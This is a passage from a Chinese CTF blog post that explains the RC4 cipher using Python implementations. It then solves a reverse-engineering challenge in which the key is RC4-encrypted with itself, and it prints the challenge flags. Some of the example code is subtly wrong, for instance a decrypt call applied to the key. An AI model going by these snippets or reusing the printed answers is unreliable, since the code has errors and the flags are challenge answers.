&lt;h3 id=&quot;suan-fa&quot;&gt;算法&lt;a class=&quot;zola-anchor&quot; href=&quot;#suan-fa&quot; aria-label=&quot;Anchor link for: suan-fa&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;该算法较为简单，文字描述有点绕，直接上代码&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def crypt(data, key):   #data为明文或密文，key为密钥
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;RC4 algorithm&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    x = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    box = range(256)   #初始化S盒
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(256):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        x = (x + box[i] + ord(key[i % len(key)])) % 256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        box[i], box[x] = box[x], box[i]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    x = y = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    out = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for char in data:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        x = (x + 1) % 256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        y = (y + box[x]) % 256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        box[x], box[y] = box[y], box[x]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        #对称密码，加密解密算法一样
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return &amp;#39;&amp;#39;.join(out)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;python中Crypto库中有该算法，具体用法如下：&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Cipher import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;data = &amp;quot;kangel&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key = &amp;quot;key&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cipher = ARC4.new(key)    #加载密钥
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m = cipher.decrypt(key)   #用该密钥解密
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print m
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;kuo-zhan&quot;&gt;扩展&lt;a class=&quot;zola-anchor&quot; href=&quot;#kuo-zhan&quot; aria-label=&quot;Anchor link for: kuo-zhan&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;RC4在有些情况下与sha1、base64一起混合使用，如果发现密文是base64编码，需考虑该算法，具体算法如下：&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import random, base64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from hashlib import sha1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def crypt(data, key):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;RC4 algorithm&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    x = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    box = range(256)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(256):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        x = (x + box[i] + ord(key[i % len(key)])) % 256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        box[i], box[x] = box[x], box[i]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    x = y = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    out = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for char in data:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        x = (x + 1) % 256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        y = (y + box[x]) % 256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        box[x], box[y] = box[y], box[x]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return &amp;#39;&amp;#39;.join(out)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def tencode(data, key, encode=base64.b64encode, salt_length=16):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;RC4 encryption with random salt and final encoding&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    salt = &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for n in range(salt_length):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        salt += chr(random.randrange(256))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    data = salt + crypt(data, sha1(key + salt).digest())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if encode:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        data = encode(data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return data
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def tdecode(data, key, decode=base64.b64decode, salt_length=16):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;RC4 decryption of encoded data&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if decode:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        data = decode(data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print data
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    salt = data[:salt_length]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print len(salt)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return crypt(data[salt_length:], sha1(key + salt).digest())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if __name__ == &amp;#39;__main__&amp;#39;:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    # 需要解密的数据
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    data = &amp;#39;UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw==&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    # 密钥
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    key = &amp;#39;welcometoicqedu&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    # 解码
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    decoded_data = tdecode(data=data, key=key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    #decoded_data = crypt(data,m)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(&amp;quot;明文是：&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print decoded_data
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#bdctf{YOU_CRAKE_THE_RC4}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;ni-xiang-ti-zhong-de-ti-xian&quot;&gt;逆向题中的体现&lt;a class=&quot;zola-anchor&quot; href=&quot;#ni-xiang-ti-zhong-de-ti-xian&quot; aria-label=&quot;Anchor link for: ni-xiang-ti-zhong-de-ti-xian&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;前天打了掘安杯，这明明是一道很简单的逆向，可就是得不出flag。&lt;&#x2F;p&gt;
&lt;p&gt;题目如下：程序为64位的ELF文件，用ida打开&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;j-kangel.github.io&#x2F;2019&#x2F;04&#x2F;09&#x2F;RC4&#x2F;1.JPG&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;当时并不知道这是RC4（主要还是菜），但是RC4算法不难，所以很容易实现。刚开始被那一段&lt;code&gt;&amp;gt;&amp;gt;31&amp;gt;&amp;gt;24&lt;&#x2F;code&gt;迷惑了很久，还恶补了一堆东西，例如：&lt;&#x2F;p&gt;
&lt;p&gt;逻辑右移与算术右移（左移都是末尾补0）&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;a = 1011
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b = a &amp;gt;&amp;gt; 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#a为无符号数
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b = 0101
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#a为有符号数,最高位为符号位，不进行移位运算，补全补符号位
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b = 1101
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;所以：对于整数来说，逻辑右移与算术右移结果相同。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上面的代码中先是有符号int（32位）右移31位，然后无符右移24位。因为被以为的数均为正数，所以最终结果都是0。&lt;&#x2F;p&gt;
&lt;p&gt;int_64如何转化为int_8（取最低字节）：模256就行了&lt;&#x2F;p&gt;
&lt;p&gt;然后写着写着就变成了RC4，未经修改的原生态代码，虽然有点乱（额，其实是非常乱），但其实并没有什么问题&lt;&#x2F;p&gt;
&lt;p&gt;可就是答案不对。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;a = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in range(256):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    a.append(i)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;v11 = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ch = &amp;quot;Th1sIsTheK3y&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for j in range(256):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v11 = (v11 + a[j] + ord(ch[j%12]))%256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v3 = a[j]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    a[j]=a[v11]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    a[v11] = v3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;v8 = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;v9 = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for k in range(24):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v8 = (v8 +1)%256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v9 = (v9+a[v8])%256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    b.append(a[(a[v9]+a[v8])%256])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#print(a)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#print(b)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key = [0x1c,0x61,0x97,0x34,0x28,0x69,0xfa,0x54,0xda,0x3a,0x2b,0xbb,0x05,0x09,0x16,0x38,0xf3,0xcf,0xd8,0xa5,0x12,0x7e,0x67,0x44]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag=&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in range(24):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    flag+=chr(key[i]^b[i])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print len(b)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print len(key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print flag
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;后来看了官方wp，说是对key，进行了一次混淆。到了这里，我多说两句关于混淆：&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;为了有效抵抗攻击者对密码体制的攻击，Shannon提出三个基本设计思想--扩散、混淆（混乱）和乘积密码。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;扩散：一位明文变化导致多位密文变化
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;混淆：进行多次加密
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这里有个puts函数，首先用key对key进行一次RC4，得到的新key再用来加密flag。由于忽略了这一点（主要还是因为菜），所以最终只能是望而却步。看了wp，在ida中alt+t中搜索call sub_400686（RC4函数），果然有两处。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;j-kangel.github.io&#x2F;2019&#x2F;04&#x2F;09&#x2F;RC4&#x2F;2.JPG&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;最后上脚本&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#coding=&amp;quot;utf-8&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Cipher import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;data = &amp;quot;\x1c\x61\x97\x34\x28\x69\xfa\x54\xda\x3a\x2b\xbb\x05\x09\x16\x38\xf3\xcf\xd8\xa5\x12\x7e\x67\x44&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key = &amp;quot;Th1sIsTheK3y&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cipher = ARC4.new(key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m = cipher.decrypt(key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key_1 = ARC4.new(m)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m = key_1.decrypt(data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print m
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;zong-jie&quot;&gt;总结&lt;a class=&quot;zola-anchor&quot; href=&quot;#zong-jie&quot; aria-label=&quot;Anchor link for: zong-jie&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;看似差之毫厘，实际则反映知识的掌握程度和解题的熟练程度。不说了，回炉再造去了。&lt;&#x2F;p&gt;
</content>
	</entry>
</feed>